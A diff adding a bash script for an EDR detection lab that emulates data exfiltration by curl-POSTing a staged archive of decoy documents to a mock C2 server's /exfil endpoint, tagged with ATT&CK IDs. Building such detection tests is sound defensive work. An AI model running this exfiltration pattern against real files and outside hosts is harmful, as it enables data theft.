@@ -1,0 +1,49 @@
+#!/bin/bash
+#
+# simulate-https-exfil.sh
+# ---------------------------------------------------------------------------
+# EDR DETECTION TEST — LAB USE ONLY
+#
+# Complements simulate-metadata-exfil.sh's DNS-tunnel exfil with a second,
+# more common channel: a direct HTTP POST of a staged archive to the lab's
+# mock C2 (services/mock_c2.py /exfil endpoint). Run
+# simulate-collection-staging.sh first to produce an archive, or this script
+# will stage decoy documents itself if none is found.
+#
+#   POST staged archive to C2       Exfiltration Over C2 Channel   (T1041)
+#   large single POST, non-business domain/port   (T1048 family)
+# ---------------------------------------------------------------------------
+set -u
+
+HOME_DIR="${HOME:-/home/root}"
+DECOY_DIR="${DECOY_DIR:-${HOME_DIR}/decoy-data}"
+RESULTS_DIR="${RESULTS_DIR:-${HOME_DIR}/results}"
+C2_HOST="${C2_HOST:-mock-c2}"
+C2_PORT="${C2_PORT:-8443}"
+SESSION="$(date +%s)"
+LOG="${RESULTS_DIR}/httpsexfil_${SESSION}.log"
+
+mkdir -p "$RESULTS_DIR"
+say() { echo -e "[$(date -u +%H:%M:%S)] $*" | tee -a "$LOG"; }
+step() { echo "" | tee -a "$LOG"; say "=== $* ==="; }
+
+say "EDR test lab :: HTTPS/HTTP exfil emulation :: session=$SESSION"
+
+ARCHIVE="$(find "$RESULTS_DIR" -maxdepth 1 -name 'staged_*.tar.gz' | sort | tail -n1)"
+if [ -z "${ARCHIVE:-}" ]; then
+    say "no staged archive found — staging decoy documents now"
+    mkdir -p "${DECOY_DIR}/documents"
+    [ -z "$(ls -A "${DECOY_DIR}/documents" 2>/dev/null)" ] && bash "$(dirname "$0")/seed-decoys.sh"
+    ARCHIVE="${RESULTS_DIR}/httpsexfil_payload_${SESSION}.tar.gz"
+    tar -czf "$ARCHIVE" -C "$DECOY_DIR" documents 2>&1 | tee -a "$LOG"
+fi
+say "using archive: $ARCHIVE ($(wc -c < "$ARCHIVE" 2>/dev/null || echo 0) bytes)"
+
+step "exfiltrate archive via HTTP POST to mock C2 (ATT&CK T1041)"
+RESP="$(curl -s --max-time 10 -X POST --data-binary "@${ARCHIVE}" \
+    -H "Content-Type: application/octet-stream" \
+    "http://${C2_HOST}:${C2_PORT}/exfil")"
+say "C2 response: $RESP"
+
+step "Done — HTTPS-style exfil complete."
+say "artifacts: $LOG  (received copy under results/c2_exfil_received/ on the mock-c2 side)"
